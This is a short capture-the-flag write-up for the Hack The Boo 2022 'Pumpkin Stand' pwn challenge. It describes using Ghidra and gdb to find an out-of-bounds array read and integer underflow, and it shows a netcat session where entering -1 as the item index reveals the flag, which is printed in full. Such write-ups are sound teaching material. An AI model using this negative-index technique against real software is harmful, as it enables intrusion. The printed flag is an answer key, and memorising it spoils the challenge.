# Hack The Boo 2022

## Pumpkin Stand

> This time of the year, we host our big festival and the one who craves the pumpkin faster and make it as scary as possible, gets an amazing prize! Be fast and try to crave this hard pumpkin!
>
>  Author: N/A
>
> [`pwn_pumpkin_stand.zip`](pwn_pumpkin_stand.zip)

Tags: _pwn_

## Solution

Analyzing the code with Ghidra shows that a integer underflow is needed to hit the condition for flag reveal. There are multiple ways to approach this, one quick way is to read outside of the memory location the item costs are located. Inspection with gdb showed that ```consts[-1]``` has the value 0x5555. Using this the flag is quickly revealed.

```
$ nc 167.71.137.174 30035

                                          ##&
                                        (#&&
                                       ##&&
                                 ,*.  #%%&  .*,
                      .&@@@@#@@@&@@@@@@@@@@@@&@@&@#@@@@@@(
                    /@@@@&@&@@@@@@@@@&&&&&&&@@@@@@@@@@@&@@@@,
                   @@@@@@@@@@@@@&@&&&&&&&&&&&&&@&@@@@@@&@@@@@@
                 #&@@@@@@@@@@@@@@&&&&&&&&&&&&&&&#@@@@@@@@@@@@@@,
                .@@@@@#@@@@@@@@#&&&&&&&&&&&&&&&&&#@@@@@@@@@@@@@&
                &@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@
                @@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&&@@@@@@@@@&@@@@@
                @@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@
                @@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@
                .@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@
                 (@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@.
                   @@@@@@@@@@@@@@&&&&&&&&&&&&&&&@@@@@@@@@@@@@@
                    ,@@@@@@@@@@@@@&&&&&&&&&&&&&@@@@@@@@@@@@@
                       @@@@@@@@@@@@@&&&&&&&&&@@@@@@@@@@@@/

Current pumpcoins: [1337]

Items:

1. Shovel  (1337 p.c.)
2. Laser   (9999 p.c.)

>> -1

How many do you want?

>> 2

Congratulations, here is the code to get your laser:

HTB{1nt3g3R_0v3rfl0w_101_0r_0v3R_9000!}
```